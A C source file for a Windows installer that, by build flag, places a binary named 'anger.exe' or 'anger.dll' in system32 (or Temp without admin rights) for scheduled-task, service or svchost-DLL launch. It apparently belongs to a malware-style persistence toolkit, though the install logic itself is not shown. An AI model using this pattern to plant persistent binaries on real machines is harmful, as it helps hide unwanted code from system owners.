#include <Windows.h>
#include <tchar.h>
#include <Shlwapi.h>

#include "..\\general\\log.h"
#include <systeminfo.h>
#include "install.h"
#include "uninstall.h"
#include "svchost.h"

#ifdef SCHEDULER
#ifdef _WIN64
#pragma comment(linker, "/OUT:..\\bin\\Debug\\x64\\installer_scheduler.exe")
#else
#pragma comment(linker, "/OUT:..\\bin\\Debug\\x86\\installer_scheduler.exe")
#endif // WIN32
#endif // SCHEDULER

#ifdef SERVICE
#ifdef _WIN64
#pragma comment(linker, "/OUT:..\\bin\\Debug\\x64\\installer_service.exe")
#else
#pragma comment(linker, "/OUT:..\\bin\\Debug\\x86\\installer_service.exe")
#endif // WIN32
#endif // SERVICE

#ifdef SVCHOST
#ifdef _WIN64
#pragma comment(linker, "/OUT:..\\bin\\Debug\\x64\\installer_svchost.dll")
#else
#pragma comment(linker, "/OUT:..\\bin\\Debug\\x86\\installer_svchost.dll")
#endif // WIN32
#endif // SVCHOST

#pragma comment(lib, "shlwapi.lib")
INT APIENTRY _tWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, INT nCmdShow)
{
	LogInit(LOG_CONSOLE);

	LogInfo(_T("Get preference info for install\r\n\r\n"));

	SystemInfo();

	LogInfo(_T("Check needed package\r\n"));
	
	/*if (!CheckRuntimeVersion(L"v4.0.30319"))
	{
		LOG(_T("Not install .Net\r\n"));
		return 0;
	}*/

	LogInfo(_T("Start install\r\n\r\n"));

	TCHAR	szInstallPath[MAX_PATH];

#ifdef SCHEDULER
	if (IsAdmin())
	{
		GetSystemWindowsDirectory(szInstallPath, ARRAYSIZE(szInstallPath));
		PathAppend(szInstallPath, _T("system32"));
		PathAppend(szInstallPath, _T("anger.exe"));
	}
	else
	{
		GetTempPath(ARRAYSIZE(szInstallPath), szInstallPath);
		PathAppend(szInstallPath, _T("anger.exe"));
	}
#endif // SCHEDULER


#ifdef SVCHOST
	if (!IsAdmin())
	{
		LogFatal(_T("Access is denied.\r\n"));

		return 0;
	}
	else
	{
		GetSystemWindowsDirectory(szInstallPath, ARRAYSIZE(szInstallPath));
		PathAppend(szInstallPath, _T("system32"));
		PathAppend(szInstallPath, _T("anger.dll"));
	}
#endif // SVCHOST

#ifdef SERVICE
	if (!IsAdmin())
	{
		LogFatal(_T("Access is denied.\r\n"));

		return 0;
	}
	else
	{
		GetSystemWindowsDirectory(szInstallPath, ARRAYSIZE(szInstallPath));
		PathAppend(szInstallPath, _T("system32"));
		PathAppend(szInstallPath, _T("anger.exe"));
	}
#endif // SERVICE



	if (!Install(szInstallPath))
	{
		LogFatal(_T("Error install - revert changes\r\n"));

		Uninstall(szInstallPath);
	}

	
	return 0;
}